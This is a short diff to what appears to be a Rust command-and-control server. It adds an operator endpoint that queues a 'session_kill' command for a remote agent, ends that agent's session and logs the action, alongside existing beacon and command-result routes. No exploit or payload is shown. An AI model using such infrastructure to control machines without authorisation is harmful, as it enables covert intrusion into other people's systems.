@@ -218,6 +218,7 @@ async fn main() {
         .route("/api/agents/:id/metrics", get(get_agent_metrics))
         .route("/api/agents/:id/logs", get(get_agent_logs))
         .route("/api/agents/:id/results", get(get_command_results))
+        .route("/api/agents/:id/session/kill", post(kill_agent_session))
         .route("/api/logs", get(get_logs))
         .route("/api/beacon", post(receive_beacon))
         .route("/api/result", post(receive_result))
@@ -245,7 +246,7 @@ async fn main() {
 
     let addr = SocketAddr::from(([0, 0, 0, 0], 3443));
     log_info(&db, &tx, "Server", None, &format!("Server listening on https://{}", addr));
-    log_info(&db, &tx, "Server", None, "Beacon endpoint: POST https://localhost:3443/api/beacon (AES-GCM encrypted)");
+    log_info(&db, &tx, "Server", None, &format!("Beacon endpoint: POST https://{}/api/beacon (AES-GCM encrypted)", addr));
 
     axum_server::bind_rustls(addr, tls_config)
         .serve(app.into_make_service())
@@ -862,4 +863,33 @@ async fn get_broadcast_history(State(state): State<ServerState>) -> Json<Value> 
         Ok(records) => Json(serde_json::to_value(records).unwrap_or(Value::Null)),
         Err(_) => Json(Value::Null),
     }
+}
+
+async fn kill_agent_session(
+    Path(id): Path<String>,
+    State(state): State<ServerState>,
+) -> Json<Value> {
+    let cmd_id = uuid::Uuid::new_v4().to_string();
+    let command = PendingCommand {
+        id: cmd_id.clone(),
+        command_type: "session_kill".to_string(),
+        payload: String::new(),
+    };
+    {
+        let mut queue = state.command_queue.write().await;
+        queue.entry(id.clone()).or_default().push(command);
+    }
+    let _ = state.session_manager.end_session(&id);
+    log_info(
+        &state.db,
+        &state.tx,
+        "Session",
+        Some(id.clone()),
+        "Session killed by operator",
+    );
+    let _ = state.tx.send(serde_json::json!({
+        "type": "SessionKilled",
+        "payload": { "agent_id": id }
+    }));
+    Json(serde_json::json!({ "success": true, "command_id": cmd_id }))
 }
